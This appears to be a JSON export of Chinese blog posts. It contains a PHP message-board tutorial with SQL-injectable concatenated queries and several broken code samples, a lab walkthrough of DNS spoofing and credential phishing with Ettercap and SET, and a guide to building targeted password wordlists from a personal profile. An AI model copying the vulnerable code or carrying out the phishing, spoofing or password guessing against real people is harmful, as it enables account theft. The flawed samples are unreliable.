&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.6修改留言页面1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;]; $message_ID=$_GET[&apos;id&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;编辑留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select Name from user where Name!=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); ?&gt; &lt;h1&gt;编辑留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;form action=&quot;update_message.php&quot; method=&quot;POST&quot;&gt; 接收人: &lt;select name=&quot;receiver&quot;&gt; &lt;option value=&quot;all&quot;&gt;所有人&lt;/option&gt; &lt;?php while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $name=$result[&apos;Name&apos;]; echo &quot;&lt;option value=&apos;$name&apos;&gt;&quot;.$name.&quot;&lt;/option&gt;&quot;; &#125; ?&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; &lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;hidden&quot; name=&quot;ID&quot; value=&quot;&lt;?php echo $message_ID; ?&gt;&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/body&gt;&lt;/html&gt; 5.PDOPDO是 PHP Date Object （PHP数据对象）的简称，目前支持的数据库包括Firebird， FreeTDS，Interbase ，MySQL，MS SQL Server， ODBC, Oracle，Postgre SQL，SQLite 以及 Sybase等。有了PDO，用户就不必再使用 mysql_*函数，aco_函数或者 mssql_\\函数，也不必再将他们封装到数据库操作类，只需要使用PDO接口中的方法就可以对不同的数据库进行操作，在选择不同数据库时，只需要修改PDO的 DNS（数据库名）就可以了。 5.1PDO构造函数连接数据库PDO构造函数的形式： 1_construct(string $dsn[,string $username[,string $password[,array $driver_options]]]) $dsn：主机IP地址及数据库名称 1$dsn=\"mysql:host=$host;dbName=$dbName\" $username：数据库用户名$password：数据库密码$driver_options：连接数据库的其他选项 通过PDO连接数据库 12345678910111213&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); echo \"Connect successed.\"; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2使用PDO执行SQL语句在PDO中，可以使用3中方式执行SQL语句，分别是exec()方法，query方法，以及预处理语句prepare()和execute()方法 5.2.1PDO::exec()方法exec()方法形式如下： 1int PDO::exec(string $statement) PDO::exec()执行一条SQL语句，并返回受影响的行数。$statement是要执行的SQL语句。 通过exec()方法执行SQL语句 123456789101112131415&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;exec($query); echo \"数据插入成功,受影响行数为：\".$result; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2.2PDO::query()方法query()方法形式如下： 1PDOStatement PDO::query(string $statement) PDO::query()可执行多条SQL语句，并以PDOStatement对象形式返回结果集。 通过PDO::query()执行SQL语句 123456789101112131415&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;query($query); print_r($result); &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2.3预处理语句：PDO::prepare()语句和execute()语句PDO::prepare()方法形式如下： 1PDOStatement PDO::prepare(string $statement[,array $driver_options]) PDOStatement::execute方法形式如下： 1bool PDOStatement::execute([array $input_parameters]) PDO::prepare()方法为PDOStatement::execute()方法准备待执行的SQL语句。SQL 语句可以包含零个或多个参数占位标记，格式是命名（:name）或问号（?）的形式，当它执行时将用真实数据取代。 在同一个 SQL 语句里，命名形式和问号形式不能同时使用；只能选择其中一种参数形式。PDOStatement::execute()方法执行一条预处理语句。 使用预处理语句执行SQL语句： 123456789101112131415161718&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;prepare($query); $res-&gt;execute(); while($result=$result-&gt;fetch(PDO::FETCH_ASSOC))&#123; echo $result['userName'].$result['Password'].$result[Name]; &#125; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.3PDOStatement::fetch5.3.1PDOStatement::fetchPDOStatement::fetch形式如下： 1mixed PDOStatement::fetch ([ int $fetch_style [, int $cursor_orientation = PDO::FETCH_ORI_NEXT [, int $cursor_offset = 0 ]]] ) 5.3.1.1参数-$fetch_style控制下一行如何返回给调用者。此值必须是 PDO::FETCH_* 系列常量中的一个，缺省为 PDO::ATTR_DEFAULT_FETCH_MODE的值 （默认为 PDO::FETCH_BOTH）。 参数 效果 PDO::FETCH_ASSOC 返回一个索引为结果集列名的数组 PDO::FETCH_BOTH（默认） 返回一个索引为结果集列名和以0开始的列号的数组 PDO::FETCH_BOUND 返回 TRUE ，并分配结果集中的列值给 PDOStatement::bindColumn() 方法绑定的 PHP 变量。 PDO::FETCH_CLASS 返回一个请求类的新实例，映射结果集中的列名到类中对应的属性名。如果 fetch_style 包含 PDO::FETCH_CLASSTYPE（例如：PDO::FETCH_CLASS PDO::FETCH_INTO 更新一个被请求类已存在的实例，映射结果集中的列到类中命名的属性 PDO::FETCH_LAZY 结合使用 PDO::FETCH_BOTH 和 PDO::FETCH_OBJ，创建供用来访问的对象变量名 PDO::FETCH_NUM 返回一个索引为以0开始的结果集列号的数组 PDO::FETCH_OBJ 返回一个属性名对应结果集列名的匿名对象 5.3.1.2参数-$cursor_orientation对于 一个 PDOStatement 对象表示的可滚动游标，该值决定了哪一行将被返回给调用者。此值必须是 PDO::FETCH_ORI_* 系列常量中的一个，默认为 PDO::FETCH_ORI_NEXT。要想让 PDOStatement 对象使用可滚动游标，必须在用 PDO::prepare() 预处理SQL语句时，设置 PDO::ATTR_CURSOR 属性为 PDO::CURSOR_SCROLL。 5.3.1.3参数-$offset对于一个 cursor_orientation 参数设置为 PDO::FETCH_ORI_ABS 的PDOStatement 对象代表的可滚动游标，此值指定结果集中想要获取行的绝对行号。 对于一个 cursor_orientation 参数设置为 PDO::FETCH_ORI_REL 的PDOStatement 对象代表的可滚动游标，此值指定想要获取行相对于调用 PDOStatement::fetch() 前游标的位置 5.3.2PDOStatement::fetchAllPDOStatement::fetchAll形式如下 1array PDOStatement::fetchAll ([ int $fetch_style [, mixed $fetch_argument [, array $ctor_args = array() ]]] ) 5.3.2.1参数-$fetch_style控制返回数组的内容如同 PDOStatement::fetch() 文档中记载的一样。默认为 PDO::ATTR_DEFAULT_FETCH_MODE 的值（ 其缺省值为 PDO::FETCH_BOTH ） 想要返回一个包含结果集中单独一列所有值的数组，需要指定 PDO::FETCH_COLUMN 。通过指定 column-index 参数获取想要的列。 想要获取结果集中单独一列的唯一值，需要将 PDO::FETCH_COLUMN 和 PDO::FETCH_UNIQUE 按位或。 想要返回一个根据指定列把值分组后的关联数组，需要将 PDO::FETCH_COLUMN 和 PDO::FETCH_GROUP 按位或。 5.3.2.2参数-$fetch_argument 参数 效果 PDO::FETCH_COLUMN 返回指定以0开始索引的列 PDO::FETCH_CLASS 返回指定类的实例，映射每行的列到类中对应的属性名 PDO::FETCH_FUNC 将每行的列作为参数传递给指定的函数，并返回调用函数后的结果 5.3.2.3参数-$ctor_args当 fetch_style 参数为 PDO::FETCH_CLASS 时，自定义类的构造函数的参数。 5.3.3PDOStatement::fetchColumnPDOStatement::fetchColumn形式如下： 1string PDOStatement::fetchColumn ([ int $column_number = 0 ] ) 5.3.3.1参数-column_number你想从行里取回的列的索引数字（以0开始的索引）。如果没有提供值，则 PDOStatement::fetchColumn() 获取第一列。 5.3.4PDOStatement::fetchObjectPDOStatement::fetchObject形式如下： 1mixed PDOStatement::fetchObject ([ string $class_name = \"stdClass\" [, array $ctor_args ]] ) 5.3.4.1参数-class_name创建类的名称。 5.3.4.2参数-ctor_args此数组的元素被传递给构造函数。 6.缺陷没有考虑防御手段。 7.参考[1] php实现留言板功能 [2] PDO中执行SQL语句的三种方法 [3] PDO中获取结果集之fetch()方法详解 [4] T-SQL教程 [5] PHP Sessions [6] PHP:PDO-Manual","categories":[],"tags":[]},{"title":"'使用Ettercap和SET进行DNS欺骗、钓鱼'","slug":"I-can-not-see-U","date":"2019-03-26T11:51:17.000Z","updated":"2019-03-26T13:48:41.268Z","comments":true,"path":"2019/03/26/I-can-not-see-U/","link":"","permalink":"https://chirec.github.io/2019/03/26/I-can-not-see-U/","excerpt":"1.工具介绍1.1Ettercap Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis. 1.2SET(Socail-Engineering-Toolkit) Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。","text":"1.工具介绍1.1Ettercap Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis. 1.2SET(Socail-Engineering-Toolkit) Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。 2.工具使用2.1Ettercap参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263Usage: ettercap [OPTIONS] [TARGET1] [TARGET2]TARGET is in the format MAC/IP/IPv6/PORTs (see the man for further detail)Sniffing and Attack options: -M, --mitm &lt;METHOD:ARGS&gt; perform a mitm attack -o, --only-mitm don&apos;t sniff, only perform the mitm attack -b, --broadcast sniff packets destined to broadcast -B, --bridge &lt;IFACE&gt; use bridged sniff (needs 2 ifaces) -p, --nopromisc do not put the iface in promisc mode -S, --nosslmitm do not forge SSL certificates -u, --unoffensive do not forward packets -r, --read &lt;file&gt; read data from pcapfile &lt;file&gt; -f, --pcapfilter &lt;string&gt; set the pcap filter &lt;string&gt; -R, --reversed use reversed TARGET matching -t, --proto &lt;proto&gt; sniff only this proto (default is all) --certificate &lt;file&gt; certificate file to use for SSL MiTM --private-key &lt;file&gt; private key file to use for SSL MiTMUser Interface Type: -T, --text use text only GUI -q, --quiet do not display packet contents -s, --script &lt;CMD&gt; issue these commands to the GUI -C, --curses use curses GUI -D, --daemon daemonize ettercap (no GUI) -G, --gtk use GTK+ GUILogging options: -w, --write &lt;file&gt; write sniffed data to pcapfile &lt;file&gt; -L, --log &lt;logfile&gt; log all the traffic to this &lt;logfile&gt; -l, --log-info &lt;logfile&gt; log only passive infos to this &lt;logfile&gt; -m, --log-msg &lt;logfile&gt; log all the messages to this &lt;logfile&gt; -c, --compress use gzip compression on log filesVisualization options: -d, --dns resolves ip addresses into hostnames -V, --visual &lt;format&gt; set the visualization format -e, --regex &lt;regex&gt; visualize only packets matching this regex -E, --ext-headers print extended header for every pck -Q, --superquiet do not display user and passwordLUA options: --lua-script &lt;script1&gt;,[&lt;script2&gt;,...] comma-separted list of LUA scripts --lua-args n1=v1,[n2=v2,...] comma-separated arguments to LUA script(s)General options: -i, --iface &lt;iface&gt; use this network interface -I, --liface show all the network interfaces -Y, --secondary &lt;ifaces&gt; list of secondary network interfaces -n, --netmask &lt;netmask&gt; force this &lt;netmask&gt; on iface -A, --address &lt;address&gt; force this local &lt;address&gt; on iface -P, --plugin &lt;plugin&gt; launch this &lt;plugin&gt; -F, --filter &lt;file&gt; load the filter &lt;file&gt; (content filter) -z, --silent do not perform the initial ARP scan -6, --ip6scan send ICMPv6 probes to discover IPv6 nodes on the link -j, --load-hosts &lt;file&gt; load the hosts list from &lt;file&gt; -k, --save-hosts &lt;file&gt; save the hosts list to &lt;file&gt; -W, --wifi-key &lt;wkey&gt; use this key to decrypt wifi packets (wep or wpa) -a, --config &lt;config&gt; use the alterative config file &lt;config&gt;Standard options: -v, --version prints the version and exit -h, --help this help screen 2.2SET1234561) Social-Engineering Attacks2) Penetration Testing (Fast-Track)3) Third Party Modules4) Update the Social-Engineer Toolkit5) Update SET configuration6) Help, Credits, and About 1234567891011 1) Spear-Phishing Attack Vectors 2) Website Attack Vectors 3) Infectious Media Generator 4) Create a Payload and Listener 5) Mass Mailer Attack 6) Arduino-Based Attack Vector 7) Wireless Access Point Attack Vector 8) QRCode Generator Attack Vector 9) Powershell Attack Vectors10) SMS Spoofing Attack Vector11) Third Party Modules 123456781) Java Applet Attack Method2) Metasploit Browser Exploit Method3) Credential Harvester Attack Method4) Tabnabbing Attack Method5) Web Jacking Attack Method6) Multi-Attack Web Method7) Full Screen Attack Method8) HTA Attack Method 1231) Web Templates2) Site Cloner3) Custom Import 1231. Java Required2. Google3. Twitter 3.实验过程3.1生成钓鱼网页生成钓鱼网页之后，使用Windows7访问，并输入账号密码进行测试，在Kali中获得输入的信息。 3.2DNS欺骗使用Ettercap进行DNS欺骗，这里使用图形化界面，也可以直接在终端输入命令。直接输入命令可以查看参考[1]。 Step 1：Scan for Hosts，然后打开Hosts List Step 2：Add to Target Step 3：Mitm 选择ARP poisoning，勾选Sniff remote connection Step 4：Plugins，选择dns_spoof 3.3钓鱼结果在进行DNS欺骗后，使用Windows7，访问www.jj.com。此时，页面显示的是之前的钓鱼网页。 输入账号密码进行测试。 4.原理DNS欺骗是一种中间人攻击形式，攻击者冒充域名服务器，向主机提供错误DNS信息，当用户尝试浏览网页时，跳转到错误的攻击者的主页。再通过钓鱼网站可以获取用户的关键信息。 5.参考[1] 技术讨论 | 利用SET和Ettercap实现内网钓鱼获取帐号密码 [2] DNS欺骗原理及其防御方案","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'生成社工字典'","slug":"Generate-Social-Engineering-Wordlist","date":"2019-03-25T12:10:41.000Z","updated":"2019-03-25T13:41:44.578Z","comments":true,"path":"2019/03/25/Generate-Social-Engineering-Wordlist/","link":"","permalink":"https://chirec.github.io/2019/03/25/Generate-Social-Engineering-Wordlist/","excerpt":"1.工具介绍两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。 1.1pydictory 你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作； 你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系； 1.2cupper cupper可以实现的功能如下： 根据目标的信息，生成目标可能使用的密码列表（核心功能） 对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率 下载作者提供的常用密码字典","text":"1.工具介绍两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。 1.1pydictory 你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作； 你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系； 1.2cupper cupper可以实现的功能如下： 根据目标的信息，生成目标可能使用的密码列表（核心功能） 对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率 下载作者提供的常用密码字典 2.工具下载2.1pydictor1git clone https://github.com/LandGrey/pydictor.git 2.2cupper1git clone https://github.com/ChireC/cupper.git 3.工具使用3.1pydictor3.1.1参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263optional arguments: -h, --help show this help message and exit -base Type Choose from (d, L, c, dL, dc, Lc, dLc) d digital [0 - 9] L lowercase letters [a - z] c capital letters [A - Z] dL Mix d and L [0-9 a-z] dc Mix d and c [0-9 A-Z] Lc Mix L and c [a-z A-Z] dLc Mix d, L and dL [0-9 a-z A-Z] -char character 使用自定义字符集生成字典 -chunk arg [arg ...] 使用排列组合生成字典 -extend arg [arg ...] 拓展字典 //插件生成字典 -plug arg [arg ...] 一段时间内生日生成字典 [begin_date] [end_date], date format: [YYYYMMDD] ftp [keyword1] [keyword2] ... 身份证后4位生成字典 chinese id card last 4 digit 身份证后6位生成字典 chinese id card last 6 digit 身份证后8位生成字典 chinese id card last 8 digit 网页原始关键词生成字典 [url_or_file] --conf [file_path] 使用语法引擎解析字典 --sedb 进入社会工程学字典生成界面 -o path, --output path 设置输入文件位置 -tool arg [arg ...] 字典合并 [dir] 字典比较 [minuend_file] [subtrahend_file] 词频统计 [&apos;v&apos;,&apos;s&apos;,&apos;vs&apos;] [file] [view_num] 字典处理 [file] 多字典文件组合 [file1] [file2] ... 安全擦除字典 [file_or_dir] 合并去重 [dir] 字典去重 [file] --len minlen maxlen 设置生成密码长度 Default: min=0 max=4 --head prefix 为密码开头增加字符 --tail suffix 为密码结尾增加字符 //编码格式 --encode encode b16 base16 encode b32 base32 encode b64 base64 encode des des algorithm and need modify code execjs execute js function and need modify code hmac hmac message digest algorithm md5 md5 message digest algorithm output 32 char md516 md5 message digest algorithm output 16 char none default and don&apos;t encode rsa rsa algorithm and need modify code sha1 sha-1 message digest algorithm sha256 sha-256 message digest algorithm sha512 sha-512 message digest algorithm test custom yourself encode method by modifying function //自定义编码方式 url url encode//出现字母和数字设置范围 --occur letter digital special Default: letter &quot;&lt;=99&quot; digital &quot;&lt;=99&quot; special &quot;&lt;=99&quot; --types letter digital special Default: letter &quot;&gt;=0&quot; digital &quot;&gt;=0&quot; special &quot;&gt;=0&quot; --regex regex Filter by regex, Default: (.*?)//正则表达式过滤 --level code Use code [1-5] to filter results, default: 3 //密码等级 --leet code [code ...] Choose leet mode code (0, 1, 2, 11-19, 21-29) 3.1.2生成社工字典 1234567891011121314151617181920python pydictor.py --sedbset cname liweiset sname lw Lweiset ename zwellset birth 19880916set usedpwd liwei123456. liwei@19880916 lw19880916_123set phone 18852006666set uphone 15500998080set hphone 76500100 61599000 01061599000set email 33125500@qq.comset email 13561207878@163.comset email weiweili@gmail.comset email wei010wei@hotmail.comset postcode 663321 962210set nickname zliliset idcard 152726198809160571set jobnum 20051230 100563set otherdate 19591004 19621012set otherdate 19870906 19880208set usedchar tiger gof gamesthrones 176003 m0n5ter ppdog 3.1.3字典分析由目标信息组合成的各种密码，由于这次填写的信息比较多，所以在字典中没有弱口令，在之前的测试中，并没有填写很多目标信息，导致字典中弱口令很多。 3.1.4使用体验在设置对象信息时，如果出现错误，会直接跳出社会工程字典生成模块，并且再次进入模块不会保存上次填写的信息。 3.2cupper3.2.1参数1234567optional arguments: -h, --help show this help message and exit -f FILE, --file FILE 对密码文件进行各种处理 -i, --interactive 交互式生成密码字典 -s, --session 管理保存输入信息的session文件 -d, --download 下载作者维护的密码字典 -v, --version 查看Logo和显示工具版本 3.2.2生成社工字典 3.2.3使用体验因为是交互式界面，所以很舒服，按照提示填写目标信息即可，要求目标信息非常多，非常详细，而且还可以根据目标对密码的了解程度，以及你生成密码的目的添加信息的信息和参数。如果目标很了解密码，还会生成加密后的密码，如果需要目标社交网络上登陆密码，还要求输入目标站点的名称。 4.参考[1] pydictor-GitHub [2] cupper-GitHub","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'使用PHP编写留言板'","slug":"Create-Message-Board-with-PHP","date":"2019-03-24T07:36:54.000Z","updated":"2019-03-24T13:19:08.425Z","comments":true,"path":"2019/03/24/Create-Message-Board-with-PHP/","link":"","permalink":"https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/","excerpt":"PHP留言板结构 1.新建Message类123456789101112131415161718class Message&#123; public $name; public $time; public $content; function __construct($n,$t,$c)&#123; $this-&gt;name=$n; $this-&gt;time=$t; $this-&gt;content=$c; &#125; function show()&#123; echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;; echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;; &#125;&#125; Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。在创建对象时，构造函数使将值赋给对象的3个属性。show()方法则是显示留言内容。 2.新建MessageBoard类","text":"PHP留言板结构 1.新建Message类123456789101112131415161718class Message&#123; public $name; public $time; public $content; function __construct($n,$t,$c)&#123; $this-&gt;name=$n; $this-&gt;time=$t; $this-&gt;content=$c; &#125; function show()&#123; echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;; echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;; &#125;&#125; Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。在创建对象时，构造函数使将值赋给对象的3个属性。show()方法则是显示留言内容。 2.新建MessageBoard类 上图左边是MessageBoard类的结构。MessageBoard类包含1个属性，messages。messages的数据类型是数组，其中存放了所有的留言。MessageBoard类包含5个方法，showForm()、saveData()、loadData()、showAllMessages()、showForm()。这5个方法的具体作用写在下面。 2.1显示页面2.1.1showForm()1234567function showForm()&#123; echo &quot;&lt;form action=&apos; &apos; method=&apos;POST&apos;&gt;&quot;; echo &quot;Name: &quot;.&quot;&lt;input type=&apos;text&apos; name=&apos;userName&apos;&gt;&quot;.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.&quot;&lt;input type=&apos;text&apos; name=&apos;content&apos;&gt;&quot;; echo &quot;&lt;input type=&apos;submit&apos;&gt;&quot;; echo &quot;&lt;/form&gt;&quot;; &#125; showForm()方法用于显示留言板的表单，通过echo输出HTML语句标签显示表单，表单提交的方式为POST。 2.1.2showAllMessages()12345function showAllMessages()&#123; foreach($this-&gt;messages as $m)&#123; $m-&gt;show(); &#125; &#125; showAllMessages()方法用于输出留言内容。上面说过messages的数据类型是数组，所以使用foreach()循环输出数组内容，messages中的元素属于Message类，所以使用自身的方法show()来显示留言内容。 2.2留言的接收和读取2.2.1receiveMessage()12345function receiveMessage()&#123; if (count($_POST)!=0)&#123; $this-&gt;saveData($_POST[&apos;userName&apos;],date(&quot;Y-M-D h:i:s&quot;,time()),$_POST[&apos;content&apos;]); &#125; &#125; receiveMessage()方法用于接收留言，如果收到留言则使用saveData()方法将留言存储起来。 2.2.2saveData()12345function saveData($u,$t,$c)&#123; echo &quot;UserName: &quot;.$u.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$t.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$c.&quot;&lt;br /&gt;&quot;; &#125; 此时的saveData()方法只是用于测试整个留言板是否正常工作，还没有连接数据库，所以无法将数据存储在数据库中。只是将要存储的内容显示在页面上。 2.2.3loadData()123456function loadData()&#123; $temp=new Message(&quot;chessur&quot;,&quot;2019.3.26&quot;,&quot;Hello World!&quot;); array_push($this-&gt;messages,$temp); $temp=new Message(&quot;Andy&quot;,&quot;2019.3.26&quot;,&quot;Hello chessur&quot;); array_push($this-&gt;messages,$temp); &#125; 和saveData()方法一样，此时的loadData()也只是测试阶段。使用$temp存储留言，使用array_push()函数将留言存放在messages数组中。 3.数据库数据库中的数据结构 上图的左边是DB类的结构，database属性和构造函数。具体内容写在下面。上图的右边是数据库中数据表的结构，4个字段：ID、name、time、content，分别表示留言发表顺序、留言者、留言时间、留言内容。 3.1数据库建立&amp;数据表建立使用PHPMyAdmin的图形化界面建立数据库以及数据表 3.1.1数据库建立 3.1.2数据表建立 3.2连接数据库3.2.1创建DB类1234567891011121314151617181920212223242526272829class DB&#123; public $database=null; function __construct()&#123; //connect $dbhost=&quot;localhost&quot;; //127.0.0.1 $account=&quot;root&quot;; $password=&quot;root&quot;; $this-&gt;database=mysql_connect($dbhost,$account,$password); if($this-&gt;database)&#123; echo &quot;DB connected.&quot;; &#125;else &#123; echo &quot;DB connect failed.&quot;; &#125; $result=mysql_select_db(&quot;db_messages&quot;,$this-&gt;database); if($result)&#123; echo &quot;DB select successed.&quot;; &#125;else&#123; echo &quot;DB select failled.&quot;; &#125; &#125; function __destruct()&#123; //disconnect mysql_close($this-&gt;database); &#125;&#125; DB类的两个方法分别是构造函数和析构函数。构造函数在对象实例化时执行，其中包含mySQL数据库的配置信息：IP地址、账户、密码。使用PHP自带的mysql_connect()函数连接mySQL数据库，使用PHP自带的mysql_select_db()函数选择数据库。析构函数在将对象销毁时断开与mySQL数据库的连接，同样适用了PHP自带的mysql_close()函数。 3.2.2MessageBoard继承DB1class MessageBoard extends DB 通过继承DB类，使MessageBoard类可以使用DB类中的方法和属性。 在继承父类后，子类可以使用父类的属性和方法，但是因为子类已经声明了自己的构造函数，所以无法直接继承父类的构造函数，可以使用下面的代码来继承父类的构造函数。 1parent::__construct(); 3.3数据库的读写3.3.1SQL语法1INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;chessur&apos;,&apos;2019-3-24&apos;,&apos;Hello World&apos;) 1SELECT * FROM `all_messages`; INSERT INTO是向数据库中插入数据SELECT是从数据库中选择数据 3.3.2saveData()1234function saveData($u,$t,$c)&#123; $query=&quot;INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;&quot;.$u.&quot;&apos;,&apos;&quot;.$t.&quot;&apos;,&apos;&quot;.$c.&quot;&apos;)&quot;; mysql_query($query); &#125; 在连接了mySQL数据库后，我们可以将savaData()方法改写为真正的方法，而不再只是测试的作用。mysql_query()函数可以执行一条mySQL语句。 3.3.3loadData()123456789function loadData()&#123; $query=&quot;SELECT * FROM `all_messages`;&quot;; $result=mysql_query($query); while($row=mysql_fetch_array($result))&#123; $temp=new Message($row[&apos;name&apos;],$row[&apos;time&apos;],$row[&apos;content&apos;]); array_push($this-&gt;messages,$temp); &#125; &#125; $query中的mySQL语句是选择表中所有数据，使用mysql_query($query)找到所有数据后，将全部留言放入messages这个数组中，完成留言数据的加载。 4.mysql函数4.1mysql_query()mysql_query() 函数执行一条 MySQL 语句。 1mysql_query(query,connection) 1mysql_query($query) 4.2mysql_connect()mysql_connect() 函数打开非持久的 MySQL 连接。 1mysql_connect(server,user,pwd,newlink,clientflag) 1mysql_open($this-&gt;database) 4.3mysql_select_db()mysql_select_db() 函数设置活动的 MySQL 数据库。如果成功，则该函数返回 true。如果失败，则返回 false。 1mysql_select_db(database,connection) 1mysql_select_db(&quot;db_messages&quot;,$this-&gt;database) 4.4mysql_close()mysql_close() 函数关闭非持久的 MySQL 连接。 1mysql_close(link_identifier) 1mysql_close($this-&gt;database) 4.5mysql_fetch_array()mysql_fetch_array() 